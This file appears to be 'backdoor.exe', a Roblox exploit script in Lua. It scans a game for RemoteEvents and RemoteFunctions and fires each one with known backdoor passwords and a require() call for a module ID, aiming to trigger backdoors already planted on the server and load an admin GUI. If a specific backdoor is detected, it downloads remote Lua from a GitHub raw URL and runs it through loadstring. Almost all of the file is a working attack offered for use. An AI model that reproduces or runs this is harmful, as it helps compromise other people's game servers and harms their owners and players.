local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(7924358164):k4scripts('%s')"):format(LocalPlayer.Name)
local invCode = "6HndYgC"

local alternativeSS = {
	run = { [1] = "5#lGIERKWEF" },
	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
	helpme = { [1] = "helpme" },
	pickett = { [1] = "cGlja2V0dA==" },
	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
}

local function notify(text)
	game:GetService("StarterGui"):SetCore(
	"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text
		}
	)
end

local function attached(possibleWait)
	if possibleWait then wait(possibleWait) end
	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
end

local function validRemote(rm)
	local fullName =  rm:GetFullName()
	local Classes = {"RemoteEvent","RemoteFunction"}

	if string.find(fullName, "DefaultChat") then return false end
	if string.find(fullName, LocalPlayer.Name) then return false end
	if rm:FindFirstChild("__FUNCTION") then return false end
	if rm.Parent == game:GetService("JointsService") then return false end

	if getgenv().blacklisted then
		if table.find(getgenv().blacklisted, fullName) then return false end
	end

	return table.find(Classes, rm.ClassName)
end

local function harked()
	local backpack = LocalPlayer.Backpack 
	return backpack:FindFirstChild("HandlessSegway") and
		Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
		Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
	return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
end
local function runBackdoor(rm)
	return rm.Name == "Run" and
	rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
	rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
end

local function scanGame()
    notify("Scanning for a backdoor.")
	if harked() then
		loadstring(game:HttpGetAsync(alternativeSS.harked))()
		return
	end

	for _, remote in pairs(game:GetDescendants()) do
		if validRemote(remote) and not attached() then
			if remote.ClassName == "RemoteEvent" then
				if emmaBackdoor(remote) then
					remote:FireServer(unpack(alternativeSS.emma), requireScript)
				end
				if runBackdoor(remote) then
					remote:FireServer(unpack(alternativeSS.run), requireScript)
				end

				remote:FireServer(unpack(alternativeSS.helpme), requireScript)
				remote:FireServer(unpack(alternativeSS.pickett), requireScript)
				
				remote:FireServer(requireScript)
			end
			if remote.ClassName == "RemoteFunction" then
				remote:InvokeServer(requireScript)
			end
			game:GetService("RunService").Stepped:Wait()
		end
	end
end


local function Main()
	notify("Make sure to join our Discord!\nCode: "..invCode)

	scanGame()

	if not attached(2) then
		notify("Unable to find backdoor.\nGame not backdoored?")
	end
end

if game:IsLoaded() then
	pcall(Main)
end

--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'
